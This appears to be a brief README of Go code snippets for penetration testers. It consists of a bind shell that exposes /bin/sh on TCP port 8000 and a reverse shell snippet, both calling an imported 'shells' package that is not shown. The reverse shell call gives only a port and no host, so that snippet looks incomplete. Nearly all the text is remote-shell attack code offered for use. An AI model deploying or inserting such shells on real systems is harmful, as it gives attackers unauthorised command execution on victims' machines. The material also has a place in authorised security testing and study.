Go Hacking
==========

Snippets of golang code for penetration testers. 



Bind Shell
----------

    package main

    import "shells"


    func main(){
        shells.BindShell("tcp", ":8000", "/bin/sh")
    }


Reverse Shell
-------------

    package main

    import "shells"


    func main(){
        shells.ReverseShell("tcp", ":8000", "/bin/sh")
    }
